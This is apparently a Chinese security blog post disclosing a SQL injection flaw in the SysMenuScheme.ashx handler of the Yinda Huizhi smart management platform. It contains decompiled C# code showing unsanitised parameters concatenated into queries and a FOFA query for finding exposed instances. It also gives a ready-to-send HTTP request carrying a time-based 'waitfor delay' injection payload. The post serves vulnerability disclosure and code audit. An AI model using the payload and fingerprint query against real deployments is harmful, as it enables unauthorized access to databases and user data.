---
title: "银达汇智智慧综合管理平台 SysMenuScheme.ashx SQL注入漏洞"
source: https://mrxn.net/jswz/windor-Module-Kernel-Controller-SysMenuScheme-sqli.html
asset_dir: assets/银达汇智智慧综合管理平台-sysmenuscheme.ashx-sql注入漏洞
---

# 银达汇智智慧综合管理平台 SysMenuScheme.ashx SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/5/26 08:12
- 912浏览
- [0评论](#comment)
- 2小时阅读

深入探索

安全研究报告

在线安全工具

软件

---

# 漏洞简介

福建银达汇智信息科技股份有限公司成立于2009年，位于福建省福州市，是一家以从事[软件](#)和信息技术服务业为主的企业。银达汇智智慧综合管理平台 `SysMenuScheme.ashx` 存在[SQL注入](https://mrxn.net/tag/SQL注入)漏洞,攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码,站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

SQL注入检测工具

# 影响版本

# fofa语法

> `title="智慧综合管理平台登入"`

# 漏洞分析

先看下 `Module/Kernel/Controller/SysMenuScheme.ashx` 引用的dll名称

代码安全审计

```
<%@ WebHandler Language="C#" CodeBehind="SysMenuScheme.ashx.cs" Class="KR.Administrator.Module.Controller.SysMenuScheme"  %>
```

再去对应dll文件 `KR.Administrator.dll` 反编译后获取 `Module.Controller.SysMenuScheme` 的执行逻辑

```
namespace KR.Administrator.Module.Controller;

public class SysMenuScheme : BaseHandler
{
  private SysMenuSchemeDao bll = new SysMenuSchemeDao();

  public override void AjaxProcess(HttpContext context)
  {
    context.Response.ContentType = "text/plain";
    string str1 = WRequest.GetString("action");
    try
    {
      if (string.op_Equality(str1, "find"))
      {
        int recordcount = 0;
        string str2 = " 1=1 ";
        if (!string.IsNullOrEmpty(WRequest.GetString("name")))
          str2 += $" and name like '%{WRequest.GetString("name")}%'";
        string strWhere = str2 + $" and org_id = {SystemHelper.CurrentOrg.id}";
        DataTable dataTableList = this.bll.GetDataTableList(WRequest.GetInt("pagesize") == 0 ? 10 : WRequest.GetInt("pagesize"), WRequest.GetInt("pageIndex") == 0 ? 1 : WRequest.GetInt("pageIndex") + 1, "*", $" {(string.IsNullOrEmpty(WRequest.GetString("SortField")) ? (object) "id" : (object) WRequest.GetString("SortField"))} {(string.IsNullOrEmpty(WRequest.GetString("SortOrder")) ? (object) "desc" : (object) WRequest.GetString("SortOrder"))}", strWhere, out recordcount);
        DataGridModel dataGridModel = new DataGridModel()
        {
          total = recordcount,
          data = dataTableList
        };
        context.Response.Write(JsonConvert.SerializeObject((object) dataGridModel));
        LogHelper.SysInfo("：查看！", new Exception(context.Request.Form.ToString()));
      }
      else if (string.op_Equality(str1, "save"))
        this.save(context);
      else if (string.op_Equality(str1, "getMenuScheme"))
      {
        DataTable dataTable = this.bll.GetDataTable("sys_menu_scheme", $" org_id={SystemHelper.CurrentOrg.id} ");
        DataRow dataRow = dataTable.NewRow();
        dataRow["id"] = (object) 0;
        dataRow["name"] = (object) "自定义";
        dataTable.Rows.InsertAt(dataRow, 0);
        context.Response.Write(JsonConvert.SerializeObject((object) dataTable));
      }
      else if (string.op_Equality(str1, "look") || string.op_Equality(str1, "update"))
      {
        KR.Model.SysMenuScheme sysMenuScheme = this.bll.GetItem((long) WRequest.GetInt("id"));
        context.Response.Write(JsonConvert.SerializeObject((object) sysMenuScheme));
      }
      else if (string.op_Equality(str1, "selectedDel"))
      {
        if (SystemHelper.checkPermission("SysMenuScheme_btnDel"))
        {
          string str3 = WRequest.GetString("ids");
          if (!string.IsNullOrEmpty(str3))
          {
            IList<KR.Model.SysMenuScheme> list = (IList<KR.Model.SysMenuScheme>) this.bll.GetList($"id in ({str3}) ");
            LogHelper.SysInfo("：删除！", new Exception(JsonConvert.SerializeObject((object) list)));
            StringBuilder stringBuilder = new StringBuilder();
            foreach (KR.Model.SysMenuScheme sysMenuScheme in (IEnumerable<KR.Model.SysMenuScheme>) list)
            {
              stringBuilder.Append(sysMenuScheme.id);
              stringBuilder.Append(",");
            }
            this.bll.Delete((ICondition) new Condition("id", FieldType.Int32, (object) stringBuilder.ToString().Trim(new char[1]
            {
              ','
            }), Comparison.In));
            context.Response.Write(SystemHelper.WriteResult("success", "删除成功！"));
          }
          else
            context.Response.Write(SystemHelper.WriteResult("error", "请选择要删除项！"));
        }
        else
          context.Response.Write(SystemHelper.WriteResult("error", "您无权限或者访问异常！请联系管理人员。"));
      }
      else if (string.op_Equality(str1, "conditionDel"))
      {
        if (SystemHelper.checkPermission("SysMenuScheme_btnDel"))
        {
          string strWhere = " 1=1 ";
          if (!string.IsNullOrEmpty(WRequest.GetString("name")))
            strWhere += $" and name like '%{WRequest.GetString("name")}%'";
          if (!string.IsNullOrEmpty(WRequest.GetString("remark")))
            strWhere += $" and remark like '%{WRequest.GetString("remark")}%'";
          if (!string.IsNullOrEmpty(WRequest.GetString("org_idBegin")))
            strWhere += $" and org_id >= {WRequest.GetString("org_idBegin")}";
          if (!string.IsNullOrEmpty(WRequest.GetString("org_idEnd")))
            strWhere += $" and org_id < {WRequest.GetString("org_idEnd")}";
          IList<KR.Model.SysMenuScheme> list = (IList<KR.Model.SysMenuScheme>) this.bll.GetList(strWhere);
          LogHelper.SysInfo("：删除！", new Exception(JsonConvert.SerializeObject((object) list)));
          StringBuilder stringBuilder = new StringBuilder();
          foreach (KR.Model.SysMenuScheme sysMenuScheme in (IEnumerable<KR.Model.SysMenuScheme>) list)
          {
            stringBuilder.Append(sysMenuScheme.id);
            stringBuilder.Append(",");
          }
          if (stringBuilder.Length > 0)
          {
            this.bll.Delete((ICondition) new Condition("id", FieldType.Int32, (object) stringBuilder.ToString().Trim(new char[1]
            {
              ','
            }), Comparison.In));
            context.Response.Write(SystemHelper.WriteResult("success", "删除成功！"));
          }
          else
            context.Response.Write(SystemHelper.WriteResult("error", "未找到符合条件的数据！"));
        }
        else
          context.Response.Write(SystemHelper.WriteResult("error", "您无权限或者访问异常！请联系管理人员。"));
      }
      else if (string.op_Equality(str1, "exportExcel"))
        this.exportExcel(context);
      else
        context.Response.Write(SystemHelper.WriteResult("error", "您无权限或者访问异常！请联系管理人员。"));
    }
    catch (Exception ex)
    {
      LogHelper.SysError($"：操作异常！action:{str1};Form:{context.Request.Form.ToString()}", ex);
      context.Response.Write(SystemHelper.WriteResult("error", ex.Message.Replace("\"", "'")));
    }
  }

  private void save(HttpContext context)
  {
    KR.Model.SysMenuScheme model = new KR.Model.SysMenuScheme();
    model.id = WRequest.GetInt("id");
    if (model.id != 0)
    {
      model = this.bll.GetItem((long) model.id);
      if (model == null)
      {
        context.Response.Write(SystemHelper.WriteResult("error", "数据保存失败！指定的记录不存在或已经被其他用户删除！"));
        return;
      }
    }
    model.name = WRequest.GetString("name").Trim();
    model.remark = WRequest.GetString("remark").Trim();
    model.org_id = SystemHelper.CurrentOrg.id;
    bool flag1;
    bool flag2;
    if (model.id != 0)
    {
      if (SystemHelper.checkPermission("SysMenuScheme_btnUpdate"))
      {
        flag1 = this.bll.Update(model);
        LogHelper.SysInfo(string.Format("：修改！", new object[0]), new Exception(JsonConvert.SerializeObject((object) model)));
        flag2 = true;
      }
      else
      {
        context.Response.Write(SystemHelper.WriteResult("error", "您无权限或者访问异常！请联系管理人员。"));
        return;
      }
    }
    else if (SystemHelper.checkPermission("SysMenuScheme_btnAdd"))
    {
      flag1 = this.bll.Add(model) > 0L;
      LogHelper.SysInfo(string.Format("：新增！", new object[0]), new Exception(JsonConvert.SerializeObject((object) model)));
      flag2 = false;
    }
    else
    {
      context.Response.Write(SystemHelper.WriteResult("error", "您无权限或者访问异常！请联系管理人员。"));
      return;
    }
    if (flag1)
    {
      if (flag2)
        context.Response.Write(SystemHelper.WriteResult("success", "修改成功！", "update"));
      else
        context.Response.Write(SystemHelper.WriteResult("success", "新增成功！", "add"));
    }
    else
      context.Response.Write(SystemHelper.WriteResult("error", "数据保存失败！操作过程中出现异常！"));
  }

  private void exportExcel(HttpContext context)
  {
    string condition = " 1=1 ";
    if (!string.IsNullOrEmpty(WRequest.GetString("sname")))
      condition += $" and name like '%{WRequest.GetString("sname")}%'";
    if (!string.IsNullOrEmpty(WRequest.GetString("sremark")))
      condition += $" and remark like '%{WRequest.GetString("sremark")}%'";
    if (!string.IsNullOrEmpty(WRequest.GetString("sorg_idBegin")))
      condition += $" and org_id >= {WRequest.GetString("sorg_idBegin")}";
    if (!string.IsNullOrEmpty(WRequest.GetString("sorg_idEnd")))
      condition += $" and org_id < {WRequest.GetString("sorg_idEnd")}";
    DataTable dataTabelToExcel = this.bll.GetDataTabelToExcel(KR.Controls.RunTime.Global.webSiteConfig.ExportCount, condition);
    if (((InternalDataCollectionBase) dataTabelToExcel.Rows).Count <= 0)
      return;
    SystemHelper.CreateExcel(dataTabelToExcel, "application/x-excel", DateTime.Now.ToString("yyyyMMddHHmmssfff"), context, "导出Excel表");
  }

  public new bool IsReusable => false;
}
```

主要的方法`AjaxProcess`根据不同的`action`参数执行不同的操作

漏洞修复方案

1. **当**`action`**为**`find`**时**：
   1. 这里构造了一个SQL查询的`strWhere`字符串，其中`name`参数直接拼接到查询中，没有看到明显的过滤或转义。这可能导致SQL注入漏洞。
   2. 例如，`name`参数被直接放入`like '%{name}%'`中，如果用户输入包含单引号或其他SQL特殊字符，可能会破坏查询结构。
2. **当**`action`**为**`selectedDel`**时**：
   1. `ids`参数被直接拼接到`id in ({str3})`中，同样存在SQL注入的风险。攻击者可以通过构造特殊的`ids`值来执行任意SQL命令（需要权限）。
3. **当**`action`**为**`conditionDel`**时**：
   1. 多个参数（`name`, `remark`, `org_idBegin`, `org_idEnd`）被拼接到`strWhere`中，尤其是`org_idBegin`和`org_idEnd`直接拼接到数值比较中，没有进行类型检查或转义，可能导致SQL注入（需要权限）。
4. **当**`action`**为**`exportExcel`**时**：
   1. 类似于`conditionDel`，多个参数被拼接到查询条件中，存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5 "SQL注入")的风险。

整体执行流程如下图所示：

软件

[![银达汇智智慧综合管理平台 SysMenuScheme.ashx SQL注入漏洞](images/img-001-f1542e7e4eca.webp)](https://image.mrxn.net/f8c68c088bb74760a63a6784ad504a56.webp)

# 漏洞复现

```
POST /Module/Kernel/Controller/SysMenuScheme.ashx HTTP/1.1
Host: windor.mrxn.net
Content-Type: application/x-www-form-urlencoded

action=exportExcel&sname='waitfor+delay'0:0:4'--
```

[![银达汇智智慧综合管理平台 SysMenuScheme.ashx SQL注入漏洞](images/img-002-4ec1dc1f94d7.webp)](https://image.mrxn.net/155f632f56b046eb8ad5f7262d76001e.webp)

成功延时 4 秒

编程

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALlElEQVR4AeycAXLjuA5E/fb+d85fuPNkESItZzKbuOrLtZhmNxoQQ0gTO5uaf26328efxMfn69XaT/t2rc57H/Mdu2/Ge428e1d698n1d+x5+Z9gDeTfuuu/dzmBbSD/Tv32Sqw2bq15uQjcgO0a+kR9ovpX0FrItXqt+a53fuaD9Idgr5fb5wz1F24DKXLF75/AYSCQqcOIq606ffNyGOu7rv9P0X57tJcajHuA8J63ToTRp9985+orhPSDEWf+w0Bmpkv7uRP49kAgU19tud9NckidfFXfdf2QejjiqkYdUmOvFeo/Q+vPfK/kvz2QVy5yeV4/gb8+EMjd5xZg5Oqv3lWQehjRPjOEeFfXUIf4YMRZz5lmn1nuT7W/PpA/3chVlxM4DMSpd4z9/M973cfH9nlDbiXkbuwc5rq+3kc+Q2sgPSGoF0auv+fVRUgdBNXP0L4dZ3WHgcxMl/ZzJ7ANBDJ1eI5nW4PU64ORq3f07oH45d3XOcQP9NT2lB4SXxSApz9lgOR7W4gOz3Fftw1kL17r3zuBf7wTv4pu2TrIXaAu9rzcvAiv1esX7VeoJsLznvpWCKmv3hX6al1xxsvz1bieEE/1TXA5EMjd0fcJc73fCdZB/ObVRXVRXYTUy0WIDkfU81WE9LLubE8w+q0TIXkY8Vl+ORCLLvzZE9gGAuMU+90Bya/0vm2IXx3mHKJDsPe3/hW0tqO1kGtAUL375RAfBFd+9Y726TqM/fb5bSB78Vr/3gmcDgTGaUI4BPtdAHNdH4x5dY8Akoeg+Y+Pj+1zRWn6a22oiTD2UNcPycMcV351GOvUO3o9dbmoXng6kDJd8XMnsA3EaYmQ6fetmBd7Xg6pX/kgeQhap1+EMQ/h5q0rhOQgOPOUzzDfsech/dQhvNdB9O6T65eL6oXbQExe+Lsn8A9kqhB0OzWtfajD6IOR67NWDvGprxDig6A++8ghefVCc7WugNFjHqJDsLwV8JyXp8I+tZ4FzPvAXN/3uJ6Q/Wm8wfrwsywYp+gevStEdRHmdeZ7HcQPQX2ifkgeRtS3R4jHWhGi61WXQ/Jdl4v6RUgdBPWJ+sSVDqkHbtcTcnuv13IgkKn17cKor6a+qoOxXh/MdfOr60DqAK33/3cBD76qtaDnOwfuPdVh5F237woh9bP8ciAz86X99ydweJfltEW3AJlq182vdEidvjPsfV7l5Vv1hnEPEF41Hx/1C/mphOhht/tTAdxWL2DzAJsNuOub0Bb9uvv09YTsT+MN1ttAnBpkujCie4XochHmunn7r1CfCPN+EN0+EA5Yuv3MC7jfqd0r3wpeXED6ae99zrh1kD7dX/ltIEWu+P0T2D6H9K306clF/TBO2zyMevdD8urWyTtC/N0n3yOMXgjvPc/4vmetV/7KVUCuU+sK/bWugOTVZ3g9IbNT+UVtORCYTxNGvSZf0b+G0ipg7q9cBSQPQftUrkL+CkJ6VF0FjPyVHuWB1EGwtIrqWVHrCkgegqXtA0a9aiv0wJgvfTmQSl7x8ydwGEhNcB99S+ZgnC6M3Dr98jOE9IGg/t4Hxry+Qljn9nmID4KVq1hdC+a+7q8e+4Cxbp/r68NAuuHiP3sC2yf11WWdPmTKEFTvdZA8BFf5rr/aD9J35a++PQepqdws9IsQv3xWUxrEB8HSKoD7559aV9gH4pPP8HpC6sTeKLbPIZDpuTcYubpTheQh2PP61Fd45ut5OYzXrf49J6/cPtTFfa7WK71yFebPsLz70K8G+RrggdcT4um8CW4D6dNzf5Dprbj6qt48pE/3QXQI6tcH0TvXB8nDA3vOWhEeXkD7hsD0e8Bm+FxAfDDHT9u9Fzw86jPcBjJLXtrPn8DyXZZ3k1uSdzQvwuNOgMfaOnhogGXbT2j1mei86+b32D3AcJfq1QfJyzvC87x++3bsebm4919PiKfyJri9y+r7gfldAXPdeqctFyF1q3z3Qfwwoj4RHnm1FXptSI0+9c7huU9/RxjrzMNcN194PSF1Cm8U10DeaBi1le2bOhwfpzL06I+3eUg9BNVXfvMipK77O9cvmi9U61i5Csg1zJdWAaMO4ZWr0P8qVk1F95dW0XXI9YDrF+Vub/Y6/JUFmVZNssL9QnQY0Xx596EO8cvFvbfW6h1hXg/R4Yhf7dH9tZ+Krssh15SLEB1GXOXrGhXmCw8DKfGK3zuB7W1vTaqib6W0WegzJ1+hPsjdow+ec32ifTovXW2F5ZmFfhj3ot6x9zCv3rl6x5nvekI8lTfB7V2W+3GKkLsFguYhfOWDMd999umor2P3yfXJZwjZyyw30+wJqYNg98KoW6dPDqPPfEeID7jeZd3e7LX9lQWZUt+f01bvXP0Mex2M14NwCNqv16mLED88/pHmXtM5pMYePb/iMNZBOATtB+H2gfCeh1Gv/DaQIlf8/gks32U53b5FOE517zmr+/jIP/+3r6m1dSLkOhAsTwWEQ1B/IUQrX0VpFbXeR2kVajDWqXesmlnog3kfa2Cet77wekLqFN4oDgOB+RQh+mraK/3sa+11MF7HvPis38oD6QlBe0C4dRAOQfXuh+TV9YnqEB8Ee77zqjsMpMQrfu8Ets8hMJ+iW3OaMPdBdP0w8pUOz32QPATt0/cDycMR9Vordl0uwtjLulfRPis/pP8+fz0h+9N4g/XyXRYcp1f77VNf8a5X7Sz0dezenofsb6/3GjnEu+Irfd97tob0hRH12lcO8cnN7/F6Qvan8QbrbSCQ6fU9QXQYsfvkMPogfHVXQPIwYvfDmPd6e7Sm496zX8PY0zqIrhfCIaiuXy7C6IPn3LrCbSBFrvj9E9gG4rQh05T3LapDfBBU1y8XX9X1nWHvW37IXmDE7pV3rB4V6rWeBaT/LDfT7NdR717fBmLywt89geVAIHfBfnq1huh92zDqEA7B7pdXzwqIr9YVPV/aPsxD6gCl7ddSFYD7r5J2DtHhOVonuo9XuT4Rcr3Ogev/h9ze7LV9UndfffowTtO8uKpb6TD20yfCmIdwGFH/M1ztcaWvenV/90H2pg7hEOy6/UTzhcu/sip5xc+fwPZJHcZpOj0Rkofg2VZ7nf6V/rfy1Qee7xHGPIS7N7F67UMd4jenLqqLMPph5PoKryekTuGN4jAQyPQg6F6dvgjJr3ivk3eE9Om63P5i1+WFesTSKuSQa8k7lrcC4qt1BYy8tK+E17Gmc/XCw0BKvOL3TuDwLsutrKYIuVvO8hAfBO0L4Wf1Z3lIH/sWQjQIlraPs557b9bjn5C+vQ9Eh+BYdbt/BoLHb8VAfBC0X+H1hNze67W9y6rp7GO1TT3mIVOWrxCe+3pf+0DqIKiuf4Z6RBhrYeT6Os56l9Z98srNwrzYPZD9ANcn9dubvbbvIfCYEpyv/Tr6tOXmO76ah+zhzA/xAf1SG+895MD973f5VvC5gOQ/6QYQHYJb4nMBc/0zfb8mxAMo3/H6HnI/hvf5YxuId8kZrrYODJPvPvuudBjr9UN0+aq+8j13xqumAnIN/aVVyEUYfeodq7ai66/wbSCvmC/Pf38Ch4FA7gIY8WwrdUfso/vheT9rrYP41SG85yE6PFCPCI8cHNdeQ7+oDqlRF83LIT4Yseetm+FhIBZf+Dsn8O2BwHg3QLjT71+WOsQHQX3mxa53rq+w5yC9KzcL/RAfBNXFWW1pMPpLq7CuY+Uq1GGsL/3bA6kmV/y9E/j2QGriFW6p1hWdl1YBx7tCbyHM8xC9elSUt0fpFeq1rpB3rNwsINeCoHUwcnV7dN518x0hfYHrk/rtzV6HJ8Spdnx13/CYNnAo633lwP1zjLwXqkN8cI72gHg7h1E377XkEF/XzYsQn7wjjHn77fEwkN7k4j97AttAINOD5/in24P0fbUe4ofgqm5/d515IL2s0Q/RV/y7utcTez/I9YHre8jtzV7bE/Jm+/q/3c7/AAAA//+sYNj8AAAABklEQVQDAFD+sMizT94sAAAAAElFTkSuQmCC)

手机扫码阅读
